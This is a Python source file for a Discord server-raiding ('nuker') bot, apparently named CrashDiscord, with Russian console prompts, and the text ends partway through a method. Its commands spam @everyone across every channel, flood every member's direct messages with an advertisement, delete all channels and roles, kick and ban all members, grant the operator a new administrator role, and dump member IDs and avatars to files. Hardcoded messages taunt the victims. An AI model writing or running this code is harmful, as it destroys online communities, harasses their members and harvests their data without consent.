from pystyle import Colors, Box, Write, Center
import nextcord
from nextcord.ext import commands
import asyncio
import json
import os
import aiohttp
import requests
import random
import datetime
import subprocess
from tools.console_version import *
import time

intents = nextcord.Intents.default()
intents.members = True
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix='!', intents=intents)
bot.current_activity = None
bot.current_status = None
bot.is_ready_event = asyncio.Event()

symbols = 'abcdefghijklmnopqrstuvwxyz0123456789'
crash_discord_ad = '@everyone\nYOU WAS BOMBED AS IN IRAC\nDOWNLOAD SAME CRASH:\nDISCORD: https://discord.gg/kERCHnVn'
crash_discord_ad_pm = 'FUCKED BY CRASH DISCORD BY METASENSETEAM\nDOWNLOAD SAME CRASH:\nDISCORD: https://discord.gg/kERCHnVn'

if not os.path.exists("configs/setup.json"):
    Write.Print(f"\n>> Кажется, конфиг был удален/перемещен, поэтому я тебя перенаправляю в первичную настройку...", Colors.red_to_blue, interval=0)
    time.sleep(10)
    subprocess.run(["python", "firstsetup.py"])
    exit(0)
else:
    with open("configs/setup.json", 'r', encoding='utf-8') as f:
        setup = json.load(f)

user_id = setup['USER_ID']
bot_id = setup['BOT_ID']
TOKEN = setup['TOKEN']
server_id = setup['SERVER']
exception_ids = [
    bot_id,
    user_id
]
base_exceptions = [
    bot_id,
    user_id
]

@bot.event
async def on_ready():
    print(f'Бот подключился как {bot.user}')
    if bot.current_activity and bot.current_status:
        await bot.change_presence(
            activity=bot.current_activity,
            status=bot.current_status
        )
    bot.is_ready_event.set()
    await soft.run()

@bot.command(name='rename_server')
async def rename_server(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name = Write.Input("\n>> Введите новое название сервера (или нажмите Enter для случайного названия): ", Colors.red_to_blue, interval=0)
        
        server_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
        await guild.edit(name=server_name)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='spam_channels')
async def spam_channels(ctx, count: int = 0, *, text: str = ""):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input("\n>> Введите количество сообщений для спама (или нажмите Enter для случайного количества от 1 до 100): ", Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(1, 100)

        if not text:
            Write.Print("\n>> @everyone пишется автоматически в начале сообщения.")
            text = Write.Input("\n>> Введите текст для спама: ", Colors.red_to_blue, interval=0)

        final_text = f"@everyone\n{text.strip()}" if text.strip() else crash_discord_ad

        channels = guild.text_channels
        for _ in range(count):
            for channel in channels:
                try:
                    await channel.send(final_text)
                except Exception as e:
                    Write.Print(f"\n>> Ошибка: {e}", Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='spam_channel')
async def spam_channel(ctx, channel_id: int = None, count: int = 0, *, text: str = ""):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return

        if channel_id is None:
            channel_id_input = Write.Input("\n>> Введите ID канала для спама (или нажмите Enter для использования текущего канала): ", Colors.red_to_blue, interval=0)
            if channel_id_input:
                channel_id = int(channel_id_input)
            else:
                channel_id = ctx.channel.id

        channel = guild.get_channel(channel_id)
        if not channel or not isinstance(channel, nextcord.TextChannel):
            Write.Print(f"\n>> Канал с ID: {channel_id} не найден или не является текстовым каналом", Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input("\n>> Введите количество сообщений для спама (или нажмите Enter для случайного количества от 1 до 100): ", Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(1, 100)
        
        if not text:
            text = Write.Input("\n>> Введите текст для спама: ", Colors.red_to_blue, interval=0)

        final_text = f"@everyone\n{text.strip()}" if text.strip() else crash_discord_ad

        for _ in range(count):
            try:
                await channel.send(final_text)
            except Exception as e:
                Write.Print(f"\n>> Ошибка: {e}", Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='delete_channels')
@commands.has_permissions(manage_channels=True)
async def delete_channels(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        rules_channel = guild.rules_channel
        rules_channel_id = rules_channel.id if rules_channel else None
        
        public_updates_channel = guild.public_updates_channel
        public_updates_channel_id = public_updates_channel.id if public_updates_channel else None
        
        channels = await guild.fetch_channels()
        for channel in channels:
            if channel.id == rules_channel_id:
                continue
            
            if channel.id == public_updates_channel_id:
                continue
            
            await channel.delete()
    
    except Exception as e:
        Write.Print(f"\n>> Error: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='flood_channels')
@commands.has_permissions(manage_channels=True)
async def flood_channels(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count = random.randint(10, 50)
        
        for _ in range(count):
            channel_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_text_channel(name=channel_name)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='full_admin')
@commands.has_permissions(manage_roles=True)
async def full_admin(ctx, user_id: int = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if user_id is None:
            user_id_input = Write.Input("\n>> Введите ID пользователя, которому нужно назначить права администратора (или нажмите Enter для использования USER_ID из конфига): ", Colors.red_to_blue, interval=0)
            if user_id_input:
                user_id = int(user_id_input)
            else:
                user_id = int(setup.get('USER_ID'))
        
        role_name = ''.join(random.choice(symbols) for _ in range(20))
        permissions = nextcord.Permissions()
        permissions.administrator = True
        role = await guild.create_role(name=role_name, permissions=permissions)
        user = guild.get_member(user_id)
        if user:
            await user.add_roles(role)
            Write.Print(f"\n>> Роль {role_name} создана и назначена пользователю {user.name}", Colors.green_to_yellow, interval=0)
        else:
            Write.Print(f"\n>> Пользователь с ID: {user_id} не найден на сервере", Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='refactor_server_icon')
async def refactor_server_icon(ctx, url: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if url is None:
            icon_path = os.path.join(os.path.dirname(__file__), 'icons', 'icon.png')
            if not os.path.exists(icon_path):
                Write.Print(f"\n>> Файл иконки icons/icon.png не найден", Colors.red_to_blue, interval=0)
                return
            
            with open(icon_path, 'rb') as icon_file:
                image_data = icon_file.read()
            
            await guild.edit(icon=image_data)
            Write.Print(f"\n>> Иконка сервера обновлена!", Colors.green_to_yellow, interval=0)
        
        else:
            async with ctx.typing():
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url) as response:
                            if response.status == 200:
                                image_data = await response.read()
                                await guild.edit(icon=image_data)
                                Write.Print(f"\n>> Иконка сервера обновлена!", Colors.green_to_yellow, interval=0)
                            else:
                                Write.Print(f"\n>> Не удалось получить изображение по URL", Colors.red_to_blue, interval=0)
                except Exception as e:
                    Write.Print(f"\n>> Ошибка: {e}", Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)



@bot.command(name='rename_all_roles')
async def rename_all_roles(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        for role in guild.roles:
            if role.id != guild.id:
                print(role.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await role.edit(name=new_name)
                except Exception as e:
                    print(f" - Ошибка: {e}")
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='rename_all_users')
async def rename_all_users(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name = Write.Input("\n>> Введите новый никнейм для всех пользователей (или нажмите Enter для случайного никнейма): ", Colors.red_to_blue, interval=0)
        
        for member in guild.members:
            if member.id not in base_exceptions:
                print(member.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await member.edit(nick=new_name)
                    print(" - OK")
                except Exception as e:
                    print(f" - Ошибка: {e}")
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

async def change_activity(bot):
    activity_types = {
        1: nextcord.ActivityType.playing,
        2: nextcord.ActivityType.listening,
        3: nextcord.ActivityType.watching,
        4: nextcord.ActivityType.competing
    }
    activity_names = {
        1: "Играет",
        2: "Слушает",
        3: "Смотрит",
        4: "Соревнуется"
    }
    statuses = {
        1: nextcord.Status.online,
        2: nextcord.Status.idle,
        3: nextcord.Status.do_not_disturb,
    }
    status_names = {
        1: "Онлайн",
        2: "Неактивен",
        3: "Оффлайн"
    }
    Write.Print("\n>> Выберите активность\n", Colors.red_to_blue, interval=0)
    for key, value in activity_types.items():
        Write.Print(f"\n>> {key}. {activity_names[key]}", Colors.red_to_blue, interval=0)
    activity_type_choice = int(Write.Input("\n>> Выберите номер активности >> ", Colors.red_to_blue, interval=0))
    Write.Print("\n>> Выберите статус >>\n", Colors.red_to_blue, interval=0)
    for key, value in statuses.items():
        Write.Print(f"\n>> {key}. {status_names[key]}", Colors.red_to_blue, interval=0)
    status_choice = int(Write.Input("\n>> Введите номер статуса >> ", Colors.red_to_blue, interval=0))
    activity_name = Write.Input("\n>> Введите имя активности >> ", Colors.red_to_blue, interval=0)
    bot.current_activity = nextcord.Activity(
        type=activity_types[activity_type_choice], 
        name=activity_name
    )
    bot.current_status = statuses[status_choice]
    if bot.is_ready():
        await bot.change_presence(
            activity=bot.current_activity,
            status=bot.current_status
        )
    Write.Print("\n>> Готово! Поставлены следующие значения:", Colors.red_to_blue, interval=0)
    Write.Print(f"\n>> Активность: {activity_names[activity_type_choice]}, Статус: {status_names[status_choice]}, Имя: {activity_name}\n", Colors.red_to_white, interval=0)

@bot.command(name='rename_all_channels')
async def rename_all_channels(ctx, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if name is None:
            name_input = Write.Input("\n>> Введите новое название для всех каналов (или нажмите Enter для случайного названия): ", Colors.red_to_blue, interval=0)
            if name_input:
                name = name_input
        
        for channel in guild.channels:
            if isinstance(channel, nextcord.TextChannel) or isinstance(channel, nextcord.VoiceChannel) or isinstance(channel, nextcord.CategoryChannel):
                print(channel.name, end="")
                new_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
                try:
                    await channel.edit(name=new_name)
                    print(" - OK")
                except Exception as e:
                    print(f" - Ошибка: {e}")
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)


@bot.command(name='flood_category')
@commands.has_permissions(manage_channels=True)
async def flood_category(ctx, count: int = 0):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input("\n>> Введите количество категорий (или нажмите Enter для случайного количества от 10 до 50): ", Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        name = Write.Input("\n>> Введите название категории (или нажмите Enter для случайного названия): ", Colors.red_to_blue, interval=0)
        
        for _ in range(count):
            category_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_category(name=category_name)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='flood_roles')
async def flood_roles(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input("\n>> Введите количество ролей (или нажмите Enter для случайного количества): ", Colors.green_to_yellow, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        if name is None:
            name = Write.Input("\n>> Введите название роли (или нажмите Enter для случайного названия): ", Colors.green_to_yellow, interval=0)
        
        for _ in range(count):
            role_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            await guild.create_role(name=role_name, hoist=True)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='flood_rename_server')
async def flood_rename_server(ctx, timer: int = 10):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if timer == 0:
            timer_input = Write.Input("\n>> Введите время (в секундах) между изменениями названия (или нажмите Enter для 10 секунд): ", Colors.red_to_blue, interval=0)
            if timer_input:
                timer = int(timer_input)
            else:
                timer = 2
        
        mode = Write.Input("\n>> 1 - Dynamic, 2 - Different\n>> Выберите режим (1/2): ", Colors.red_to_blue, interval=0)
        
        if mode.lower() == '1':
            name = Write.Input("\n>> Введите название сервера: ", Colors.red_to_blue, interval=0)
            if not name:
                Write.Print(f"\n>> Название сервера не введено", Colors.red_to_blue, interval=0)
                return
            
            if len(name) >= 2:
                await guild.edit(name=name[:2])
                await asyncio.sleep(timer)
            
            for char in name[2:]:
                await guild.edit(name=guild.name + char)
                await asyncio.sleep(timer)
        
        elif mode.lower() == '2':
            names = []
            for i in range(1, 6):
                name = Write.Input(f"\n>> Введите название {i} (или нажмите Enter для завершения ввода): ", Colors.red_to_blue, interval=0)
                if not name:
                    break
                names.append(name)
            
            if not names:
                Write.Print(f"\n>> Названия не введены", Colors.red_to_blue, interval=0)
                return
            
            index = 0
            start_time = time.time()
            while True:
                await guild.edit(name=names[index])
                index = (index + 1) % len(names)
                await asyncio.sleep(timer)
        
        else:
            Write.Print(f"\n>> Неверный режим. Введите '1' или '2'.", Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)



async def add_exception(user_id: int):
    try:
        if not os.path.exists("configs/exceptions.json"):
            base_exceptions = [bot_id, user_id]
            with open("configs/exceptions.json", "w") as f:
                json.dump(base_exceptions, f, indent=4)
            exception_list = base_exceptions
        else:
            with open("configs/exceptions.json", "r") as f:
                exception_list = json.load(f)

        if user_id not in exception_list:
            exception_list.append(user_id)
            with open("configs/exceptions.json", "w") as f:
                json.dump(exception_list, f, indent=4)
            Write.Print(f"\n>> Пользователь {user_id} добавлен в исключения!", Colors.green_to_yellow, interval=0)
        else:
            Write.Print(f"\n>> Этот пользователь уже есть в исключениях.", Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Ошибка при добавлении в исключения: {e}", Colors.red_to_blue, interval=0)


@bot.command(name='change_config')
async def change_config(ctx=None):
    while True:
        with open('configs/setup.json', 'r', encoding='utf-8') as f:
            setup = json.load(f)

        user_id = setup.get('USER_ID', 'не задано')
        bot_id = setup.get('BOT_ID', 'не задано')
        token = setup.get('TOKEN', 'не задан')
        server_data = setup.get('SERVER', {})
        server_id = server_data.get('id', 'не задано')
        server_name = server_data.get('name', 'неизвестно')

        bot_name = bot.user.name if bot.user else "неизвестно"

        Write.Print("\n=== ИЗМЕНЕНИЕ КОНФИГУРАЦИИ ===\n", Colors.red_to_blue, interval=0)
        Write.Print(f"\n1. ID личного аккаунта: {user_id}", Colors.red_to_white, interval=0)
        Write.Print(f"\n2. ID бота: {bot_id}", Colors.red_to_white, interval=0)
        Write.Print(f"\n3. Токен бота: {token} (имя: {bot_name})", Colors.red_to_white, interval=0)
        Write.Print(f"\n4. ID сервера: {server_id} (имя: {server_name})", Colors.red_to_white, interval=0)
        Write.Print(f"\n5. Вернуться назад\n", Colors.red_to_white, interval=0)

        choice = Write.Input("\n>> Введите номер пункта для изменения: ", Colors.red_to_blue, interval=0)

        if choice == '1':
            setup['USER_ID'] = Write.Input(">> Новый ID личного аккаунта: ", Colors.red_to_white, interval=0)
        elif choice == '2':
            setup['BOT_ID'] = Write.Input(">> Новый ID бота: ", Colors.red_to_white, interval=0)
        elif choice == '3':
            setup['TOKEN'] = Write.Input(">> Новый токен бота: ", Colors.red_to_white, interval=0)
        elif choice == '4':
            new_id = Write.Input(">> Новый ID сервера: ", Colors.red_to_white, interval=0)
            name = await soft.get_server_name(int(new_id))
            setup['SERVER'] = {'id': int(new_id), 'name': name}
            setup['SERVER_ID'] = int(new_id)
        elif choice == '5':
            break
        else:
            Write.Print("\n>> Неверный выбор. Попробуй снова.", Colors.red_to_blue, interval=0)
            continue

        with open('configs/setup.json', 'w', encoding='utf-8') as f:
            json.dump(setup, f, indent=4)

        Write.Print("\n>> Конфигурация обновлена!\n", Colors.green_to_yellow, interval=0)


@bot.command(name='dump_users')
async def dump_users(ctx):
    try:
        with open("configs/setup.json", 'r', encoding='utf-8') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID не найден в configs/setup.json", Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Сервер с ID {target_server_id} не найден", Colors.red_to_blue, interval=0)
            return

        await guild.chunk()

        users = {}
        avatars = {}
        i = 0

        for member in guild.members:
            users[i] = {
                'NAME': member.name,
                'ID': member.id,
                'BORN': str(member.created_at.strftime("%Y-%m-%d %H:%M:%S"))
            }
            avatars[member.id] = {
                'AVATAR': str(member.avatar.url) if member.avatar else None
            }
            i += 1

        timestamp = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
        dump_folder = os.path.join("dump", str(target_server_id), timestamp)
        os.makedirs(dump_folder, exist_ok=True)

        with open(os.path.join(dump_folder, "users.json"), 'w', encoding='utf-8') as f:
            json.dump(users, f, indent=4, ensure_ascii=False)

        with open(os.path.join(dump_folder, "avatars.json"), 'w', encoding='utf-8') as f:
            json.dump(avatars, f, indent=4, ensure_ascii=False)

        Write.Print(f"\n>> Сохранено {i} пользователей в: {dump_folder}", Colors.green_to_yellow, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Ошибка при сборе пользователей: {e}", Colors.red_to_blue, interval=0)


@bot.command(name='delete_all')
async def delete_all(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        await delete_channels(ctx)
        await delete_roles(ctx)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='kick_users')
async def kick_users(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        for member in guild.members:
            if member.id not in base_exceptions:
                await member.kick(reason="Сервер уничтожен с помощью CrashDiscord: URL")
                Write.Print(f"\n>> Пользователь {member.name} ({member.id}) кикнут", Colors.green_to_yellow, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='ban_users')
async def ban_users(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        for member in guild.members:
            if member.id not in base_exceptions:
                await member.ban(reason="Сервер уничтожен с помощью CrashDiscord: URL")
                Write.Print(f"\n>> Пользователь {member.name} ({member.id}) забанен", Colors.green_to_yellow, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='flood_pm')
async def flood_pm(ctx, *, text: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return

        if not text:
            text_input = Write.Input("\n>> Введите текст для спама в ЛС (или нажмите Enter для текста по умолчанию): ", Colors.red_to_blue, interval=0)
            text = text_input if text_input else crash_discord_ad_pm

        for member in guild.members:
            try:
                await member.send(text)
            except Exception as e:
                Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='flood_mass_pm')
async def flood_mass_pm(ctx, count: int = 0, *, text: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)

        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return

        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return

        if count == 0:
            count_input = Write.Input("\n>> Введите кол-во сообщений (или нажмите Enter для случайного количества от 5 до 15): ", Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(5, 15)

        if not text:
            text_input = Write.Input("\n>> Введите текст для массовой рассылки в ЛС (или нажмите Enter для текста по умолчанию): ", Colors.red_to_blue, interval=0)
            text = text_input if text_input else crash_discord_ad_pm

        for _ in range(count):
            for member in guild.members:
                try:
                    await member.send(text)
                except Exception as e:
                    Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)



@bot.command(name='give_random_roles')
async def give_random_roles(ctx, count: int = 0, *, name: str = None):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        if count == 0:
            count_input = Write.Input("\n>> Введите количество ролей (или нажмите Enter для случайного количества от 10 до 50): ", Colors.red_to_blue, interval=0)
            if count_input:
                count = int(count_input)
            else:
                count = random.randint(10, 50)
        
        if name is None:
            name_input = Write.Input("\n>> Введите название роли (или нажмите Enter для случайного названия): ", Colors.red_to_blue, interval=0)
            if name_input:
                name = name_input
        
        for _ in range(count):
            role_name = name if name else ''.join(random.choice(symbols) for _ in range(20))
            role = await guild.create_role(name=role_name, hoist=True)
            user = random.choice([member for member in guild.members if member.id not in base_exceptions])
            if user:
                await user.add_roles(role)
                Write.Print(f"\n>> Роль {role_name} создана и назначена пользователю {user.name}", Colors.green_to_yellow, interval=0)
            else:
                Write.Print(f"\n>> Нет доступных пользователей для назначения роли", Colors.red_to_blue, interval=0)
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

@bot.command(name='delete_roles')
async def delete_roles(ctx):
    try:
        with open("configs/setup.json", 'r') as f:
            setup = json.load(f)
        
        target_server_id = setup.get('SERVER', {}).get('id')
        if not target_server_id:
            Write.Print(f"\n>> SERVER_ID not found in configs/setup.json", Colors.red_to_blue, interval=0)
            return
        
        guild = bot.get_guild(int(target_server_id))
        if not guild:
            Write.Print(f"\n>> Server with ID: {target_server_id} not found", Colors.red_to_blue, interval=0)
            return
        
        for role in guild.roles:
            if role.id != guild.id:
                print(role.name, end="")
                try:
                    await role.delete()
                except Exception as e:
                    print(f" - Ошибка: {e}")
    
    except Exception as e:
        Write.Print(f"\n>> Произошла ошибка: {e}", Colors.red_to_blue, interval=0)

async def get_server_name(self, server_id: int):
    headers = {
        "Authorization": f"Bot {self.token}",
        "Content-Type": "application/json"
    }
    try:
        response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}", headers=headers)
        if response.status_code == 200:
            return response.json().get("name", "Unknown")
        else:
            return "Unknown"
    except Exception as e:
        print(f"{e}")
        return "Unknown"


class Soft:
    def __init__(self, user_id: int, bot_id: int, token: str, bot):
        self.user_id = user_id
        self.bot_id = bot_id
        self.token = token
        self.bot = bot
        self.server_id = None
        self.server_name = None

    async def run(self):
        await bot.is_ready_event.wait()
        os.system('cls')
        Write.Print(id_text, Colors.red_to_blue, interval=0)

        if os.path.exists('configs/setup.json'):
            with open('configs/setup.json', 'r') as f:
                setup = json.load(f)
            self.server_id = setup.get('SERVER', {}).get('id')
            self.server_name = setup.get('SERVER', {}).get('name')

        if self.server_id:
